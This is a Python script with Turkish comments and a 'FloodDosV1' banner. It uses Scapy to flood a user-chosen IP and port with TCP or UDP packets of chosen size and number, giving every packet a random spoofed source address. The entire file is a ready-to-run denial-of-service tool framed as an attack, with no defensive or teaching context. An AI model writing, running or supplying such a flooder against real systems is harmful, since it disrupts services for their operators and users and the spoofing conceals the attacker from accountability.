from scapy.all import *
import time
import random
giriş = '''___________.__               ________               ____   ________ 
\_   _____/|  |   ____   ____\______ \   ____  _____\   \ /   /_   |
 |    __)  |  |  /  _ \ /  _ \|    |  \ /  _ \/  ___/\   Y   / |   |
 |     \   |  |_(  <_> |  <_> )    `   (  <_> )___ \  \     /  |   |
 \___  /   |____/\____/ \____/_______  /\____/____  >  \___/   |___|
     \/                              \/           \/                '''
print(giriş)

time.sleep(1.2)

# Kullanıcıdan hedef IP adresini alın
target_IP = input("Hedef IP adresini girin: ")

# Kullanıcıdan hedef port numarasını alın
target_port = int(input("Hedef Port numarasını girin: "))

# Kullanıcıdan paket boyutunu alın
packet_size = int(input("Paket boyutunu (byte cinsinden) girin: "))

# Kullanıcıdan saldırı protokolünü alın
protocol = input("Saldırı protokolü (TCP veya UDP) girin: ")

# 0.1 saniyede bir paket göndermek için zaman aralığı
interval = 0.01

# Belirli sayıda paket göndermek için döngü oluşturma
num_packets = int(input("Gönderilecek paket sayısını girin: "))
packet_count = 0  # Sayaç değişkeni

if protocol == "TCP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / TCP(dport=target_port) / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("TCP paketi gönderildi: IP = {}, Port = {}, Paket Sayısı = {}".format(packet[IP].dst, packet[TCP].dport, packet_count))
        time.sleep(interval)
        
elif protocol == "UDP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / UDP(dport=target_port) / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("UDP paketi gönderildi: IP = {}, Port = {}, Paket Sayısı = {}".format(packet[IP].dst, packet[UDP].dport, packet_count))
        time.sleep(interval)
        
else:
    print("Geçersiz protokol. Lütfen TCP veya UDP girin.")
